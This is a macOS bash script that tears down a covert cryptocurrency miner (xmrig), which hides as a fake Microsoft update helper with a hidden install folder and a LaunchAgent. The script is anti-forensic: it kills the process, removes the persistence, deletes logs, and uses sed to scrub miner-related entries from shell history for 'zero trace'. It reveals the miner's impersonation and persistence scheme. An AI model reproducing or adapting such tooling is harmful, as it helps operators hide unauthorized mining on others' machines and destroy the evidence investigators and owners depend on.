#!/usr/bin/env bash
# remove_usdt.sh — Zero-trace removal of USDT miner

DISGUISE_NAME="com.microsoft.updateassistant.helper"
INSTALL_DIR="$HOME/Library/Application Support/.msuah"
PLIST_PATH="$HOME/Library/LaunchAgents/${DISGUISE_NAME}.plist"
LOG_PATH="$HOME/Library/Logs/${DISGUISE_NAME}.log"
GUI_DOMAIN="gui/$(id -u)"

echo ""
echo "=========================================="
echo " USDT Miner — Full Removal"
echo "=========================================="

echo "[1/6] Killing process..."
pkill -9 -f "$DISGUISE_NAME" 2>/dev/null && echo "      ✓ Process killed" || echo "      — Not running"
pkill -9 -f "xmrig" 2>/dev/null || true
sleep 1

echo "[2/6] Removing from launchd + Background Items..."
# bootout = fully removes from Background Items list (not just stops it)
launchctl bootout "$GUI_DOMAIN" "$PLIST_PATH" 2>/dev/null && echo "      ✓ Removed from Background Items" || true
launchctl unload -w "$PLIST_PATH" 2>/dev/null || true
launchctl remove "$DISGUISE_NAME" 2>/dev/null || true
# Clean old bundle ID too
launchctl bootout "$GUI_DOMAIN" ~/Library/LaunchAgents/com.microsoft.update.agent.plist 2>/dev/null || true
launchctl unload ~/Library/LaunchAgents/com.microsoft.update.agent.plist 2>/dev/null || true
rm -f ~/Library/LaunchAgents/com.microsoft.update.agent.plist 2>/dev/null || true
echo "      ✓ launchd clean"

echo "[3/6] Removing files..."
rm -rf "$INSTALL_DIR" && echo "      ✓ Install dir removed"

echo "[4/6] Removing plist..."
rm -f "$PLIST_PATH" && echo "      ✓ Plist removed"

echo "[5/6] Wiping logs..."
rm -f "$LOG_PATH" && echo "      ✓ Log wiped"
rm -f "$HOME/Library/Logs/${DISGUISE_NAME}"* 2>/dev/null || true

echo "[6/6] Scrubbing history..."
for H in "$HOME/.zsh_history" "$HOME/.bash_history"; do
  [[ -f "$H" ]] && sed -i '' '/mine_usdt\|xmrig\|unmineable\|updateassistant\|microsoft\.update\|TFgAiy/d' "$H" 2>/dev/null && echo "      ✓ $H cleaned"
done
history -c 2>/dev/null || true

echo ""
[[ ! -d "$INSTALL_DIR" && ! -f "$PLIST_PATH" && ! -f "$LOG_PATH" ]] \
  && echo " ✓  Complete — Zero trace remaining." \
  || echo " [!] Check manually."
echo "=========================================="
echo ""
